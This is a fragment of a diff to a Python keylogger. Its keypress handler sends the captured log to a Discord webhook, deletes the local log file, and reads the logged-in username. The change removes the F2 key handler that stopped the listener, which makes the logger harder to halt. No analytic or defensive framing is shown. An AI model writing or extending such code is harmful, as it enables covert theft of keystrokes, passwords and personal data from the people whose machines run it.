@@ -29,11 +29,6 @@ def on_press(key):
         discord_webhook_send(W_U)
         os.remove('logs.txt')
 
-def on_release(key):
-    if key == Key.f2:
-        # Stop listener
-        return False
-
 def discord_webhook_send(webhook_url):
     release = date.today()
     user = os.getlogin()
